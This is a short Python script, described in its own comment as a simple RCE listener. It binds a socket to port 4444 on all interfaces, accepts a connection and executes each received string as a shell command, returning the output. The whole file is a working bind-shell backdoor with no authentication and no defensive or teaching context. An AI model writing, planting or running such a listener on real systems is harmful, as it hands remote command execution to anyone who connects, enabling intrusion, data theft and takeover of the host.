import socket
import subprocess

# Simple RCE listener (binds to port 4444)
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(1)
print("RCE listener started on port 4444...")
conn, addr = s.accept()
print(f"Connection from {addr}")
while True:
    cmd = conn.recv(1024).decode().strip()
    if not cmd:
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        conn.sendall(output.encode())
    except Exception as e:
        conn.sendall(str(e).encode())
conn.close()
